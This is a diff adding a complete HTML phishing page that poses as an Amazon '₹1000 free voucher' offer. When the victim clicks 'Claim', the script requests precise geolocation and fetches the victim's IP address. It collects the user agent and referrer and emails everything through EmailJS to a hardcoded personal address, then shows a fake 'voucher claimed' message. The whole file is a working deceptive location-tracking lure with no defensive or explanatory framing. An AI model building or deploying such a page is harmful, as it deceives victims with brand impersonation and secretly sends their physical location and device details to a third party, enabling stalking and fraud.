@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Voucher - ₹1000 Free</title>
+
+    <!-- FAVICON -->
+    <link rel="icon" type="image/png"
+        href="https://imgs.search.brave.com/65LyR07DQNDQcbr2dhhceuJPOLOWtKta2KqXNBtDiaQ/rs:fit:500:0:1:0/g:ce/aHR0cHM6Ly93YWxs/cGFwZXJjYXZlLmNv/bS93cC93cDc3NzEy/MjQucG5n">
+
+    <!-- AMAZON FONT -->
+    <link rel="stylesheet"
+        href="https://fonts.googleapis.com/css2?family=AmazonEmber:wght@300;400;500;700&display=swap">
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'AmazonEmber', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #ff9900 0%, #ff7f00 50%, #e67e22 100%);
+            color: #111;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            line-height: 1.5;
+        }
+
+        .container {
+            background: white;
+            padding: 48px;
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
+            max-width: 520px;
+            width: 100%;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 6px;
+            background: linear-gradient(90deg, #ff9900, #ff7f00, #e67e22);
+        }
+
+        .amazon-logo {
+            width: 120px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            color: #111;
+            margin-bottom: 12px;
+            font-size: 2.2em;
+            font-weight: 700;
+            background: linear-gradient(135deg, #111 0%, #333 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .voucher-amount {
+            font-size: 2.8em;
+            font-weight: 700;
+            background: linear-gradient(135deg, #ff9900, #ff7f00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .subtitle {
+            color: #555;
+            margin-bottom: 32px;
+            font-size: 1.1em;
+            font-weight: 400;
+        }
+
+        .info {
+            color: #666;
+            margin-bottom: 32px;
+            font-size: 0.95em;
+            text-align: center;
+            background: #fff8e1;
+            padding: 20px;
+            border-radius: 12px;
+            border-left: 4px solid #ff9900;
+        }
+
+        .permission-btn {
+            background: linear-gradient(135deg, #ff9900 0%, #ff7f00 100%);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 1.1em;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            max-width: 320px;
+            box-shadow: 0 8px 25px rgba(255, 153, 0, 0.4);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .permission-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 35px rgba(255, 153, 0, 0.5);
+            background: linear-gradient(135deg, #ff7f00 0%, #e67e22 100%);
+        }
+
+        .permission-btn:active {
+            transform: translateY(-1px);
+        }
+
+        .loading {
+            display: none;
+            color: #ff7f00;
+            font-size: 1em;
+            font-weight: 500;
+            margin: 28px 0;
+        }
+
+        .spinner {
+            border: 3px solid #f3f4f6;
+            border-top: 3px solid #ff9900;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 12px;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .result {
+            display: none;
+            margin-top: 28px;
+            padding: 28px;
+            background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
+            border-radius: 12px;
+            border-left: 6px solid #10b981;
+            box-shadow: 0 4px 20px rgba(16, 185, 129, 0.15);
+        }
+
+        .result h3 {
+            color: #059669;
+            margin-bottom: 16px;
+            font-size: 1.3em;
+            font-weight: 700;
+        }
+
+        .success-message {
+            color: #059669;
+            margin-bottom: 20px;
+            font-size: 1em;
+            font-weight: 500;
+            background: rgba(16, 185, 129, 0.1);
+            padding: 12px;
+            border-radius: 8px;
+        }
+
+        .coords {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-family: 'SF Mono', Monaco, 'Roboto Mono', monospace;
+            font-size: 0.95em;
+            text-align: left;
+            word-break: break-all;
+            border: 2px solid #e5e7eb;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+
+        .label {
+            color: #6b7280;
+            font-size: 0.85em;
+            margin-bottom: 8px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .maps-section {
+            margin-top: 20px;
+        }
+
+        .maps-link {
+            color: #1f2937;
+            text-decoration: none;
+            font-size: 0.9em;
+            word-break: break-all;
+            display: block;
+            padding: 16px;
+            background: white;
+            border-radius: 10px;
+            border: 2px solid #e5e7eb;
+            margin: 12px 0;
+            font-weight: 500;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+
+        .maps-link:hover {
+            background: #f9fafb;
+            text-decoration: underline;
+            transform: translateY(-1px);
+        }
+
+        .button-group {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-top: 20px;
+        }
+
+        .copy-btn {
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 0.9em;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
+        }
+
+        .copy-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(16, 185, 129, 0.4);
+        }
+
+        .error {
+            color: #dc2626;
+            background: #fef2f2;
+            border: 2px solid #fecaca;
+            padding: 20px;
+            border-radius: 12px;
+            margin: 24px 0;
+            font-size: 0.95em;
+            font-weight: 500;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 36px 24px;
+                margin: 10px;
+            }
+
+            h1 {
+                font-size: 1.9em;
+            }
+
+            .voucher-amount {
+                font-size: 2.4em;
+            }
+
+            .button-group {
+                flex-direction: column;
+                width: 100%;
+            }
+
+            .copy-btn {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <!-- AMAZON LOGO -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon" class="amazon-logo">
+
+        <h1>Congratulations!</h1>
+        <span class="voucher-amount">₹1000</span>
+        <p class="subtitle">Free Amazon Voucher</p>
+
+        <div class="info">
+            🎁 You've been selected for a <strong>₹1000 Amazon Voucher</strong>!<br>
+            Click below to claim instantly. To claim allow some required permissions for voucher delivery.
+        </div>
+
+        <button class="permission-btn" onclick="requestLocation()">
+            🎉 Claim ₹1000 Voucher Now
+        </button>
+
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            Verifying eligibility...
+        </div>
+
+        <div class="result" id="result">
+            <h3>✅ Voucher Claimed Successfully!</h3>
+            <p class="success-message">Your ₹1000 voucher details have been sent to our verification team.</p>
+            <div class="coords">
+                <div class="label">Verification Data</div>
+                <div id="coords"></div>
+            </div>
+            <div class="maps-section">
+                <div class="label">Location Map</div>
+                <a class="maps-link" id="mapsLink" target="_blank" rel="noopener"></a>
+            </div>
+            <div class="button-group">
+                <button class="copy-btn" onclick="copyToClipboard('coords')">📋 Copy Data</button>
+                <button class="copy-btn" onclick="copyToClipboard('mapsLink')">🗺️ Copy Map Link</button>
+            </div>
+        </div>
+
+        <div class="error" id="error" style="display: none;"></div>
+    </div>
+
+    <script>
+        // ⚠️ REPLACE THESE WITH YOUR EMAILJS CREDENTIALS (Required)
+        emailjs.init("sFyc4qhqeMe2IoZ7U"); // EmailJS Dashboard → Account → Public Key
+
+        let currentPosition = null;
+
+        function requestLocation() {
+            const btn = document.querySelector('.permission-btn');
+            const loading = document.getElementById('loading');
+            const result = document.getElementById('result');
+            const error = document.getElementById('error');
+
+            btn.style.display = 'none';
+            loading.style.display = 'block';
+            result.style.display = 'none';
+            error.style.display = 'none';
+
+            if (!navigator.geolocation) {
+                showError('Location services not supported by your browser.');
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                onLocationSuccess,
+                onLocationError,
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 60000
+                }
+            );
+        }
+
+        async function onLocationSuccess(position) {
+            currentPosition = position;
+            const { latitude, longitude, accuracy } = position.coords;
+            const timestamp = new Date().toLocaleString('en-IN', {
+                timeZone: 'Asia/Kolkata',
+                weekday: 'short',
+                year: 'numeric',
+                month: 'short',
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit'
+            });
+
+            document.getElementById('coords').innerHTML =
+                `📍 Latitude: ${latitude.toFixed(6)}<br>
+                 📍 Longitude: ${longitude.toFixed(6)}<br>
+                 📏 Accuracy: ${Math.round(accuracy)}m<br>
+                 🕒 Claim Time: ${timestamp}<br>
+                 💻 Device: ${navigator.userAgent.slice(0, 60)}...`;
+
+            const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}&z=16`;
+            const linkElement = document.getElementById('mapsLink');
+            linkElement.href = mapsUrl;
+            linkElement.textContent = `🗺️ View on Google Maps: ${mapsUrl}`;
+
+            // SEND LOCATION TO YOUR EMAIL
+            await sendVoucherEmail(latitude, longitude, accuracy, timestamp);
+
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('result').style.display = 'block';
+        }
+
+        async function sendVoucherEmail(lat, lng, accuracy, timestamp) {
+            try {
+                const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+                const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'Unknown');
+
+                await emailjs.send('service_rck843j', 'template_f91jyos', {
+                    to_email: 'tarunroy0218@gmail.com',  // ← YOUR EMAIL HERE
+                    voucher_code: 'AMZ-' + Math.random().toString(36).substr(2, 9).toUpperCase(),
+                    latitude: lat.toFixed(6),
+                    longitude: lng.toFixed(6),
+                    accuracy: Math.round(accuracy) + 'm',
+                    timestamp: timestamp,
+                    maps_url: mapsUrl,
+                    ip_address: ip,
+                    device: navigator.userAgent.slice(0, 100),
+                    full_coords: `${lat.toFixed(6)}, ${lng.toFixed(6)}`,
+                    referrer: document.referrer || 'Direct'
+                });
+
+                console.log('✅ Voucher claim emailed!');
+            } catch (error) {
+                console.error('❌ Email failed:', error);
+                showError('Verification data captured but email failed. Contact support.');
+            }
+        }
+
+        function onLocationError(error) {
+            document.getElementById('loading').style.display = 'none';
+            let message = '';
+
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    message = "Location access denied. Enable permissions to claim voucher.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    message = "Location unavailable. Try again or check GPS.";
+                    break;
+                case error.TIMEOUT:
+                    message = "Request timed out. Please try again.";
+                    break;
+                default:
+                    message = "Location error occurred. Please try again.";
+            }
+
+            showError(message);
+            document.querySelector('.permission-btn').style.display = 'block';
+        }
+
+        function showError(message) {
+            const errorDiv = document.getElementById('error');
+            errorDiv.innerHTML = `❌ ${message}`;
+            errorDiv.style.display = 'block';
+        }
+
+        function copyToClipboard(elementId) {
+            let text;
+            if (elementId === 'coords') {
+                text = document.getElementById('coords').textContent;
+            } else {
+                text = document.getElementById('mapsLink').textContent;
+            }
+
+            navigator.clipboard.writeText(text).then(() => {
+                const btn = event.target;
+                const originalText = btn.textContent;
+                btn.innerHTML = '✅ Copied!';
+                btn.style.background = '#059669';
+                setTimeout(() => {
+                    btn.innerHTML = originalText;
+                    btn.style.background = '';
+                }, 2000);
+            });
+        }
+    </script>
+</body>
+
+</html>
